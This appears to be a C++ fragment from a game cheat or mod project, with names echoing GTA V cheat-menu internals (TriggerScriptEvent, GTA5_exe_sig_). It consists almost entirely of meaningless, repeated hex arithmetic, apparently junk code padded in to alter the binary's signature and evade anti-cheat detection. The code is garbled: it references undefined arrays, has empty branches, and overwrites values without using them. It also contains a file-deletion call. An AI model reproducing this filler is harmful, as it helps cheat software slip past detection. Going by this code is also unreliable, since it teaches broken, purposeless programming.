				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			remove(pathFile.c_str());
		}
		void CriarArquivo(std::string FilePathAndExtension)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
